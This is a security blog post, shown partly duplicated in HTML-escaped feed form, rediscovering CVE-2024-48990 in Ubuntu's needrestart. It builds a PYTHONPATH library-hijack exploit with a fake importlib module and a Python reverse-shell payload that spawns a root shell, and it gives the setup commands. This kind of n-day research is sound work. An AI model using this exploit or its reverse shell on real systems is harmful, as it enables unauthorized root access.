&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./importlib
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./importlib/__init__.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./main.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The contents of &lt;code&gt;main.py&lt;/code&gt; are below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ main.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;import sys
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In &lt;code&gt;./importlib/__init__.py&lt;/code&gt;, I write Python code that will create a &lt;code&gt;hacked.txt&lt;/code&gt; file:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat ./importlib/__init__.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;import os
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;os.system&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;touch hacked.txt&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s put this idea to the test! I will &lt;code&gt;export PYTHONPATH=/tmp/needrestart&lt;/code&gt; and manually replicate the &lt;code&gt;python&lt;/code&gt; process that &lt;code&gt;needrestart&lt;/code&gt; executes.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://ally-petitt.com:443/images/needrestart-testing-importlib.png&#34; alt=&#34;The &amp;lt;code&amp;gt;hacked.txt&amp;lt;/code&amp;gt; file being created after importing &amp;lt;code&amp;gt;sys&amp;lt;/code&amp;gt; with the modified &amp;lt;code&amp;gt;PYTHONPATH&amp;lt;/code&amp;gt; value pointing to &amp;lt;code&amp;gt;/tmp/needrestart&amp;lt;/code&amp;gt;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;It works! Let&amp;rsquo;s see if we can port this attack directly to &lt;code&gt;needrestart&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;launching-the-exploit&#34;&gt;Launching the exploit&lt;/h2&gt;
&lt;p&gt;I modified &lt;code&gt;main.py&lt;/code&gt; to be an infinite loop so that it continues running while &lt;code&gt;needrestart&lt;/code&gt; is searching the process list. The purpose of this file is to simply trigger the Python interpreter scan with our desired &lt;code&gt;PYTHONPATH&lt;/code&gt; value.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat main.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; True:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	pass
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s up the ante here and get a reverse shell as root.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat importlib/__init__.py 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;import os,pty,socket;s&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;socket.socket&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;;s.connect&lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;,1337&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;os.dup2&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s.fileno&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;,f&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; f in&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0,1,2&lt;span style=&#34;color:#f92672&#34;&gt;)]&lt;/span&gt;;pty.spawn&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sh&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I executed &lt;code&gt;python3 ./main.py&lt;/code&gt; with our malicious &lt;code&gt;PYTHONPATH&lt;/code&gt; variable.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ export PYTHONPATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/tmp/needrestart
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ python3 ./main.py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In a separate terminal, I verified that our process was showing up and the desired &lt;code&gt;PYTHONPATH&lt;/code&gt; variable was set in the way that &lt;code&gt;needrestart&lt;/code&gt; would read it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ps ax | grep python3
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;428477&lt;/span&gt; pts/13   R+     0:03 python3 ./main.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat /proc/428477/environ | grep --text -oP &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PYTHONPATH[^\x00]*&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# verify our environment variable shows up&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PYTHONPATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/tmp/needrestart
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;Note: Make sure that the python3 binary that you are running is located at a path that follows this regex pattern for &lt;code&gt;needrestart&lt;/code&gt; to recognize it as a valid Python program: &lt;code&gt;^/usr/(local/)?bin/python([23][.\d]*)?$&lt;/code&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Now, I will test the exploit by setting up a &lt;code&gt;nc&lt;/code&gt; listener and attempting to install &lt;code&gt;curl&lt;/code&gt; using &lt;code&gt;apt&lt;/code&gt;!&lt;/p&gt;
&lt;video width=&#34;100%&#34; controls&gt;
    &lt;source src=&#34;https://ally-petitt.com:443/videos/CVE-2024-48990_poc.mp4&#34; type=&#34;video/mp4&#34;&gt;
&lt;/video&gt;
&lt;p&gt;It worked! We have successfully identified and exploited the n-day, CVE-2024-48990. In a real-world environment, it is likely that a system administrator or cron job would periodically perform library upgrades on the vulnerable server through a package manager. The package manager, with elevated privileges, would launch &lt;code&gt;needrestart&lt;/code&gt;, which ends up scanning our attacker-controlled process and ultimately executing our desired Python code as root.&lt;/p&gt;
&lt;p&gt;Thanks for reading!&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<p><img loading="lazy" src="/images/ubuntu-logo.png" alt="Ubuntu logo"  />
</p>
<h1 id="introduction">Introduction</h1>
<p>On November 19th, 2024, Qualys publicly disclosed five local privilege escalation vulnerabilities discovered in the <code>needrestart</code> binary that comes installed by default on Ubuntu Server installations. They disclose the technical details of these <a href="https://www.qualys.com/2024/11/19/needrestart/needrestart.txt">here</a>, however, I will be attempting to rediscover CVE-2024-48990 prior to reading the technical details based purely on the information from the CVE description and references. Then, I will create my own exploit that gives me a reverse shell as root.</p>
<p>I have never used <code>needrestart</code> and I have very little familiarity with Perl, so I am going in blind. Let&rsquo;s find an N-day!</p>
<p><strong>TL;DR</strong>: I was able to set PYTHONPATH to a location where I created a fake <code>importlib</code> implementation that triggered a reverse shell as root via library path hijacking. The exploit files can be found on my <a href="https://github.com/ally-petitt/CVE-2024-48990-Exploit">Github</a>.</p>
<h2 id="becoming-familiar-with-needrestart">Becoming Familiar with <code>needrestart</code></h2>
<p>I will begin by cloning the <code>needrestart</code> repository and getting a high-level overview of what it does.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/liske/needrestart
</span></span></code></pre></div><p>A glance at the <a href="https://github.com/liske/needrestart/blob/master/README.md">README</a> reveals the purpose of <code>needrestart</code>:</p>
<blockquote>
<p><em>needrestart</em> checks which daemons need to be restarted after library upgrades.</p>
</blockquote>
<p>It seems that <code>needrestart</code> is invoked by package managers via hook scripts in <code>/ex</code> after library upgrades. Of course, package managers like <code>apt</code> are typically executed with root privileges, which makes <code>needrestart</code> a target for Local Privilege Escalation (LPE) vulnerabilities.</p>
<p>I installed <code>needrestart</code> from the Ubuntu repositories to interact with it directly.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo apt install needrestart
</span></span><span style="display:flex;"><span>$ needrestart --version
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>needrestart 3.6 - Restart daemons after library updates.
</span></span><span style="display:flex;"><span>-- snip --
</span></span></code></pre></div><p>Since this is version 3.6 and the patch was introduced in version 3.8, this <code>needrestart</code> installation is vulnerable.</p>
<h1 id="tracking-down-cve-2024-48990">Tracking Down CVE-2024-48990</h1>
<p>The <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48990">description</a> of this CVE is the following:</p>
<blockquote>
<p>Qualys discovered that needrestart, before version 3.8, allows local attackers to execute arbitrary code as root by tricking needrestart into running the Python interpreter with an attacker-controlled PYTHONPATH environment variable.</p>
</blockquote>
<p>Additionally, a <a href="https://github.com/liske/needrestart/commit/fcc9a4401392231bef4ef5ed026a0d7a275149ab">patch</a> on the file <code>perl/lib/NeedRestart/Interp/Python.pm</code> is linked in the CVE references section with the commit message &ldquo;interp: do not set PYTHONPATH environment variable to prevent a LPE&rdquo;. These are very substantial hints.</p>
<p>The patched file is in the <code>NeedRestart::Interp::Python</code> module. This module was specified in the README as a part of the <code>needrestart</code> interpreter scanning feature, which searches for outdated source code files in Python, Ruby, Perl, and Java.</p>
<h2 id="pythonpath-explained">PYTHONPATH explained</h2>
<p>According to the official <a href="https://docs.python.org/3/using/cmdline.html#envvar-PYTHONPATH">Python documentation</a>, <code>PYTHONPATH</code> defines the default search path for module files that are imported. In fact, I have used PYTHONPATH within CTF competitions to execute my own user-controlled Python code with executed privileges via library path hijacking.</p>
<h2 id="pythonpath-assignment-in-needrestart">PYTHONPATH Assignment in <code>needrestart</code></h2>
<p>Let&rsquo;s look at how <code>PYTHONPATH</code> is being set within <code>needrestart</code>. I will checkout to a vulnerable version of the source code to look further.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git checkout tags/v3.6
</span></span></code></pre></div><p>I used the search functionality to locate where <code>PYTHONPATH</code> is being set within the <code>files()</code> subroutine.</p>
<p><img loading="lazy" src="/images/needrestart-pythonpath.png" alt=""  />
</p>
<p>The <code>nr_parse_env()</code> subroutine above is defined in <code>perl/lib/NeedRestart/Utils.pm</code> and reads the <code>/proc/&lt;pid&gt;/environ</code> file of the Python process that it is checking and returns an array of the environment variables used by that process.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">nr_parse_env</span>($) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> $pid <span style="color:#f92672">=</span> shift;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> $fh;
</span></span><span style="display:flex;"><span>    open($fh, <span style="color:#e6db74">&#39;&lt;&#39;</span>, <span style="color:#e6db74">&#34;/proc/$pid/environ&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">return</span> (); <span style="color:#75715e"># read environment variables from environ file</span>
</span></span><span style="display:flex;"><span>    local $/ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;\000&#34;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> @env <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;$fh&gt;</span>;
</span></span><span style="display:flex;"><span>    chomp(@env);
</span></span><span style="display:flex;"><span>    close($fh);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> map { (<span style="color:#e6db74">/^([^=]+)=(.*)$/</span> ? ($1, $2) : ()) } @env;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Scrolling to lines 202-207 of <code>perl/lib/NeedRestart/Interp/Python.pm</code> sheds some insight into the Python code that is executed after the <code>PYTHONPATH</code> environment variable is set.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>    <span style="color:#75715e"># get include path</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> ($pyread, $pywrite) <span style="color:#f92672">=</span> nr_fork_pipe2($self<span style="color:#f92672">-&gt;</span>{debug}, $ptable<span style="color:#f92672">-&gt;</span>{exec}, <span style="color:#e6db74">&#39;-&#39;</span>); <span style="color:#75715e"># Equivalent to `python -` on the CLI</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">print</span> $pywrite <span style="color:#e6db74">&#34;import sys\nprint(sys.path)\n&#34;</span>; <span style="color:#75715e"># This code is passed into Python&#39;s stdin</span>
</span></span><span style="display:flex;"><span>    close($pywrite);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> ($path) <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;$pyread&gt;</span>;
</span></span><span style="display:flex;"><span>    close($pyread);
</span></span></code></pre></div><p>At a high level, this is a breakdown of the most relevant steps from the code shared so far:</p>
<ol>
<li>The <code>files()</code> subroutine of the Python interpreter checker is called with the PID of a Python process as the argument.</li>
<li>The environment variables associated with that process are parsed.
<ul>
<li>If a <code>PYTHONPATH</code> environment variable is found, <code>$ENV</code> is set to contain that value.</li>
</ul>
</li>
<li>A forked process of Python is being launched where the code <code>import sys\nprint(sys.path)\n</code> is being executed.</li>
</ol>
<h3 id="the-env-variable">The <code>%ENV</code> Variable</h3>
<p>As stated in the <a href="https://perldoc.perl.org/Env">Perl documentation</a>, &ldquo;Perl maintains environment variables in a special hash named %ENV&rdquo;.</p>
<p>Even though <code>%ENV</code> is not explicitly passed as a parameter to the child Python process that is being created by <code>needrestart</code>, Perl will still carry over those values behind the scenes, which is why the value of <code>%ENV</code> is significant.</p>
<h3 id="seed-of-an-attack-idea">Seed of an Attack Idea</h3>
<p>A potential attack strategy is forming: launch a Python process with the <code>PYTHONPATH</code> set to an attacker-controlled directory and perform a library path hijacking attack to execute arbitrary Python code.</p>
<p>Before we can create a proof-of-concept for this idea, however, we must first verify that we can do the following:</p>
<ul>
<li>Trigger the Python interpreter scan to check an attacker-controlled process.</li>
<li>Identify a Python library that can be hijacked.
<ul>
<li>The imported module <code>sys</code> is built-in to Python and does not rely on an external module path. Since Python does not search through external files in the search path for <code>sys</code>, we will have to be more creative with our approach.</li>
</ul>
</li>
</ul>
<h3 id="triggering-the-python-interpreter-check">Triggering the Python Interpreter Check</h3>
<p>As <a href="/en/posts/2024-12-25_rediscovering-cve-2024-48990-and-crafting-my-own-exploit/#tracking-down-cve-2024-48990">previously mentioned</a>, <code>needrestart</code> supports interpreter checks on Python, Ruby, Perl, and Java programs. These interpreter checks are iteratively invoked by the <code>needrestart_interp_check()</code> subroutine on a given process in <code>perl/lib/NeedRestart.pm</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">needrestart_interp_check</span>($$$$$) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> $debug <span style="color:#f92672">=</span> shift;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> $pid <span style="color:#f92672">=</span> shift;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">--</span> snip <span style="color:#f92672">--</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> <span style="color:#66d9ef">my</span> $interp (values %Interps) { <span style="color:#75715e"># iterate through Python, Ruby, Perl, and Java interpreter checkers</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($interp<span style="color:#f92672">-&gt;</span>isa($pid, $bin)) { <span style="color:#75715e"># check that argv[0] of the process is supported by the current interpreter checker</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">--</span> snip <span style="color:#f92672">--</span>
</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">my</span> %files <span style="color:#f92672">=</span> $interp<span style="color:#f92672">-&gt;</span>files($pid, <span style="color:#f92672">\</span>%InterpCache); <span style="color:#75715e"># call the vulnerable files() subroutine on the process</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">--</span> snip <span style="color:#f92672">--</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>In turn, <code>needrestart_interp_check()</code> is called in line 584 by the main <code>/needrestart</code> Perl script when <code>$restart</code> is false and <code>interpscan</code> is not disabled by the configuration.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>	<span style="color:#66d9ef">unless</span>($restart <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>$nrconf{interpscan}) {
</span></span><span style="display:flex;"><span>	    $restart<span style="color:#f92672">++</span> <span style="color:#66d9ef">if</span>(needrestart_interp_check($nrconf{verbosity} <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>, $pid, $exe, $nrconf{blacklist_interp}, $opt_t));
</span></span><span style="display:flex;"><span>	}
</span></span></code></pre></div><p>Luckily, <code>$nrconf{interpscan}</code> is enabled by default.</p>
<p><img loading="lazy" src="/images/needrestart-nrconf.png" alt="&lt;code&gt;$nrconf{interpscan}&lt;/code&gt; being set to 0"  />
</p>
<p>Another factor to consider is the PID that is being passed to <code>needrestart_interp_check()</code> since that corresponds with the process that the <code>PYTHONPATH</code> environment variable is being read from. Searching for the value of <code>$pid</code> in <code>/needrestart</code> reveals that the program iterates through a list of PIDs stored in <code>$ptable</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>    <span style="color:#66d9ef">my</span> $ptable <span style="color:#f92672">=</span> nr_ptable();
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">--</span> snip <span style="color:#f92672">--</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">my</span> $pid (sort {$a <span style="color:#e6db74">&lt;=&gt;</span> $b} keys %$ptable) {
</span></span></code></pre></div><p>The <code>$ptable</code> hash is populated with a list of all process objects accessible to the user executing <code>needrestart</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#66d9ef">my</span> %ptable;
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    local $SIG{__WARN__} <span style="color:#f92672">=</span> <span style="color:#66d9ef">sub</span> {};
</span></span><span style="display:flex;"><span>    %ptable <span style="color:#f92672">=</span> map {$_<span style="color:#f92672">-&gt;</span>pid <span style="color:#f92672">=&gt;</span> $_} @{ <span style="color:#66d9ef">new</span> Proc::ProcessTable(enable_ttys <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">-&gt;</span>table };
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">sub</span> <span style="color:#a6e22e">nr_ptable</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">\</span>%ptable;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This verifies that we will be able to invoke <code>needrestart_interp_check()</code> with the PID of our malicious process since all of the processes are iterated through.</p>
<h1 id="exploit-development">Exploit Development</h1>
<h2 id="flushing-out-the-plan">Flushing out the Plan</h2>
<p>Since I couldn&rsquo;t do library path hijacking with the built-in <code>sys</code> module, I thought about other options that I could target within the short Python snippet <code>import sys\nprint(sys.path)</code> that is executed in <code>Python.pm</code>.</p>
<p>There are two other notable tokens aside from <code>sys</code>: <code>print</code> and <code>import</code>. I decided to read more about how <code>import</code> in the official <a href="https://docs.python.org/3/reference/simple_stmts.html#import">documentation</a>. In particular, this snippet from the docs stood out to me:</p>
<blockquote>
<p>importlib.import_module() is provided to support applications that determine dynamically the modules to be loaded.</p>
</blockquote>
<p>It seems that using the <code>import</code> statement in python can trigger the <code>importlib</code> module. I used the <code>find</code> command to verify that <code>importlib</code> is indeed a dynamically loaded library rather than a Python built-in like <code>sys</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ find / -name importlib 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/lib/python3.12/importlib
</span></span></code></pre></div><p>Maybe we can take advantage of <code>importlib</code> being dynamically loaded along with the fact that the contents of <code>__init__.py</code> are automatically executed when a module is loaded. I created a directory in <code>/tmp/needrestart</code> with the following structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./importlib
</span></span><span style="display:flex;"><span>./importlib/__init__.py
</span></span><span style="display:flex;"><span>./main.py
</span></span></code></pre></div><p>The contents of <code>main.py</code> are below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ main.py
</span></span><span style="display:flex;"><span>import sys
</span></span></code></pre></div><p>In <code>./importlib/__init__.py</code>, I write Python code that will create a <code>hacked.txt</code> file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat ./importlib/__init__.py
</span></span><span style="display:flex;"><span>import os
</span></span><span style="display:flex;"><span>os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;touch hacked.txt&#34;</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Let&rsquo;s put this idea to the test! I will <code>export PYTHONPATH=/tmp/needrestart</code> and manually replicate the <code>python</code> process that <code>needrestart</code> executes.</p>
<p><img loading="lazy" src="/images/needrestart-testing-importlib.png" alt="The &lt;code&gt;hacked.txt&lt;/code&gt; file being created after importing &lt;code&gt;sys&lt;/code&gt; with the modified &lt;code&gt;PYTHONPATH&lt;/code&gt; value pointing to &lt;code&gt;/tmp/needrestart&lt;/code&gt;"  />
</p>
<p>It works! Let&rsquo;s see if we can port this attack directly to <code>needrestart</code>.</p>
<h2 id="launching-the-exploit">Launching the exploit</h2>
<p>I modified <code>main.py</code> to be an infinite loop so that it continues running while <code>needrestart</code> is searching the process list. The purpose of this file is to simply trigger the Python interpreter scan with our desired <code>PYTHONPATH</code> value.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat main.py
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> True:
</span></span><span style="display:flex;"><span>	pass
</span></span></code></pre></div><p>Let&rsquo;s up the ante here and get a reverse shell as root.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat importlib/__init__.py 
</span></span><span style="display:flex;"><span>import os,pty,socket;s<span style="color:#f92672">=</span>socket.socket<span style="color:#f92672">()</span>;s.connect<span style="color:#f92672">((</span><span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,1337<span style="color:#f92672">))</span>;<span style="color:#f92672">[</span>os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">()</span>,f<span style="color:#f92672">)</span><span style="color:#66d9ef">for</span> f in<span style="color:#f92672">(</span>0,1,2<span style="color:#f92672">)]</span>;pty.spawn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;sh&#34;</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>I executed <code>python3 ./main.py</code> with our malicious <code>PYTHONPATH</code> variable.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ export PYTHONPATH<span style="color:#f92672">=</span>/tmp/needrestart
</span></span><span style="display:flex;"><span>$ python3 ./main.py
</span></span></code></pre></div><p>In a separate terminal, I verified that our process was showing up and the desired <code>PYTHONPATH</code> variable was set in the way that <code>needrestart</code> would read it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ps ax | grep python3
</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">428477</span> pts/13   R+     0:03 python3 ./main.py
</span></span><span style="display:flex;"><span>$ cat /proc/428477/environ | grep --text -oP <span style="color:#e6db74">&#39;PYTHONPATH[^\x00]*&#39;</span> <span style="color:#75715e"># verify our environment variable shows up</span>
</span></span><span style="display:flex;"><span>PYTHONPATH<span style="color:#f92672">=</span>/tmp/needrestart
